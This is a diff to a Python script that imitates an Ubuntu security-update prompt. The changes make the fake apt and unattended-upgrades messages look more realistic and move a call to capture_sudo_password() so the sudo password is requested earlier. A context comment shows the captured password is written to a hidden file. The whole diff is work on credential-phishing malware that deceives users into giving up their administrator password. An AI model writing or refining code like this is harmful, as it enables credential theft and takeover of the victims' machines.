@@ -134,18 +134,22 @@ def main():
     try:
         clear_screen()
         
-        # Security update message
-        print("Ubuntu has detected that important security updates have not been installed.")
-        print("The following security updates are available and should be installed immediately:")
+        print("Unattended-upgrades: Security updates have not been installed.")
+        print("The following security updates are pending:")
+        print("  ca-certificates libssl3 linux-firmware openssl systemd")
+        print()
+        print("It is recommended that you apply these updates immediately.")
+        print("To do so, run the following command:")
+        print("  sudo apt update && sudo apt upgrade")
         print()
         
-        print("Reading package lists...")
+        password = capture_sudo_password()
+        
+        print("Reading package lists... Done")
         time.sleep(1)
-        
-        print("Building dependency tree...")
-        print("Reading state information...")
+        print("Building dependency tree       ")
+        print("Reading state information... Done")
         time.sleep(2)
-        
         print("The following packages will be upgraded:")
         print("  ca-certificates libssl3 linux-firmware openssl systemd")
         print("5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")
@@ -153,8 +157,6 @@ def main():
         print("After this operation, 0 B of additional disk space will be used.")
         print()
         time.sleep(1)
-        
-        password = capture_sudo_password()
         
         # Write password to hidden file
         try:
